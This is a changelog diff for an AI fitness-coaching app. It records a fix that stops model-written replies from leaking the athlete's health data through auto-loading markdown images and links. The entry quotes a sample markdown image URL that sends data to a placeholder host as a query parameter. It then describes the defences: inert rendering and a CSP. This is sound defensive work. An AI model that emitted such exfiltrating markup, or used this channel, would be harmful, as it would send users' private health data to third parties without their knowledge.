@@ -7,6 +7,37 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Fixed
+
+- **The coach's reply could reach a third-party host** (`src/components/coachMarkdown.tsx`,
+  `src/components/AIChat.tsx`, `nginx.conf`) — the message body is model-authored text rendered with
+  react-markdown, whose component map only remapped headings. Everything else
+  was the library default, which renders `img` and `a` with arbitrary targets.
+  A `![](https://host/?d=…)` in a coach reply therefore fired an outbound GET
+  the moment the message painted: no click, nothing visible to the athlete.
+
+  Not an XSS report — react-markdown renders no raw HTML without `rehype-raw`,
+  and that is not installed. It is an egress one, and what travels through it is
+  the reason to care: the coach prompt carries the athlete's health data by
+  construction (#499), and since the LLM has no tool-calling, a rendered remote
+  reference is the *only* way text the model produces can leave the browser.
+
+  `img` and `a` now render inert, keeping the alt text and the link target as
+  plain text so nothing disappears silently either. The component map moved to
+  its own module so the guarantee can be tested without the chat component's
+  mock stack — and because exporting a non-component from a component file
+  breaks fast refresh. Nothing is lost by this: the
+  coach's citations never came through markdown — they arrive structured on
+  `msg.sources` and are still rendered as real links.
+
+  A CSP in `nginx.conf` is the second, independent layer, so the guarantee does
+  not depend on a component map staying correct through a future refactor, and
+  so a compromised frontend dependency has no egress path either. Verified
+  against a production build: the bundle has one same-origin module script and
+  no inline script, no `<img>` tags, no external fonts or assets; the API is
+  same-origin (`VITE_BACKEND_URL` is the frontend's own host), and the Authelia
+  logout is a top-level navigation, which `connect-src` does not govern.
+
 ## [0.35.0] - 2026-09-13
 
 ### Changed
